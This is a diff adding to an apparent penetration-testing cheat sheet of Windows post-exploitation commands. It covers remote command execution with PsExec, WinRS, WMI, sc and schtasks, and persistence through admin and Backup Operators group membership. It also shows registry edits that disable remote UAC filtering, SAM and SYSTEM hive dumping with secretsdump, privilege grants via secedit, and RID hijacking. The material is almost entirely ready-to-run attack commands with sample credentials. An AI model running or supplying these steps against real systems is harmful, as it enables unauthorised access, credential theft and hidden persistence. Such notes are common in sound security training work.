@@ -269,8 +269,111 @@ wmic product get name,version,vendor<br>
 Find for CVE:s online<br>
 
 # Pivoting
-###Running Commands As Another User
+### Running Commands As Another User
 ## PSExec<br>
 psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe<br>
+
+## WinRS<br>
+### When WinRM is enabled Ports: 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)<br>
+winrs.exe -u:Administrator -p:Mypass123 -r:target cmd<br>
+
+## SMBCLIENT
+smbclient -c 'put myinstaller.msi' -U username -W ZA '//server.sa.domain.local/admin$/' password<br>
+ putting file myinstaller.msi as \myinstaller.msi<br>
+ 
+ ## PowerShell
+$username = 'Administrator';<br>
+$password = 'Mypass123';<br>
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; <br>
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;<br>
+Enter-PSSession -Computername TARGET -Credential $credential<br>
+or<br>
+Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}<br>
+
+## WMI
+$Opt = New-CimSessionOption -Protocol DCOM<br>
+$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop<br>
+$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";<br>
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}<br>
+### WMI (LEGACY)<br>
+wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe" <br>
+
+## Sc
+### Ports: 135/TCP, 49152-65535/TCP (DCE/RPC) 445/TCP (RPC over SMB Named Pipes) 139/TCP (RPC over SMB Named Pipes)
+#### Administrator required
+### Note: sc doesn't work with SSH, spawn another shell (eg netcat) before using this
+Start:<br>
+sc.exe \\TARGET create servicename binPath= "net user munra Pass123 /add" start= auto<br>
+sc.exe \\TARGET start servicename<br>
+Shut Down:<br>
+sc.exe \\TARGET stop servicename<br>
+sc.exe \\TARGET delete servicename<br>
+
+## Scheduled Tasks
+### Same restrictions as sc
+#### To Start:
+schtasks /s TARGET /RU "SYSTEM" /create /tn "task1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 <br>
+
+schtasks /s TARGET /run /TN "task1" <br>
+## To Shutdown
+schtasks /S TARGET /TN "THMtask1" /DELETE /F<br>
+
+# Persistence
+## Also Check Out:
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md
+
+## Add User To Admin Group
+net localgroup administrators thmuser0 /add<br>
+## Add To Backup Operators Group
+### Note: Backup operators can read any file on machine which essentially means admin access, also adding to Remote Management Users group so we can RDP and WinRM. Also, UAC makes some restrictions when logging in remotely so update a register key<br>
+### Setup
+net localgroup "Backup Operators" user1 /add<br>
+net localgroup "Remote Management Users" user1 /add<br>
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1<br>
+After Login (Using Evil-WinRM )<br>
+Get Sam & System Files<br>
+reg save hklm\system system.bak<br>
+reg save hklm\sam sam.bak<br>
+download system.bak<br>
+download sam.bak<br>
+### Dump Hashes
+python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL<br>
+# Special Privileges
+#### We basically add SeBackupPrivilege and SeRestorePrivilege to our account<br>
+
+## Export Current Config For Editing<br>
+secedit /export /cfg config.inf<br>
+notepad config.inf<br>
+## Add Our Username To SeBackupPrivilege And SeRestorePrivilege Lines
+### Note: using username is fine
+
+## Import Our New Config
+secedit /import /cfg config.inf /db config.sdb<br>
+secedit /configure /db config.sdb /cfg config.inf<br>
+
+## Modify WinRM Service So We Can Login Via WinRm
+### Add our user and give it full control via UI.
+Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI<br>
+
+# RID Hijacking
+We basically update registry values in a way that system thinks we are administrator<br>
+
+## Find RID For Our User
+Note: RID is last number set after last - of the SID<br>
+wmic useraccount get name,sid<br>
+## Edit Our Registry Value
+Note: PsExec64 needed<br>
+Open Registry Editor<br>
+PsExec64.exe -i -s regedit<br>
+Navigate To Correct Folder<br>
+<b>Note: RID here is hex-presentation of our previously found RID<br></b>
+HKLM\SAM\SAM\Domains\Account\Users\RID<br>
+Edit F Value<br>
+Find RID value from registry and change it to F4 01 (500 in decimal)<br>
+
+
+
+
+
 
 
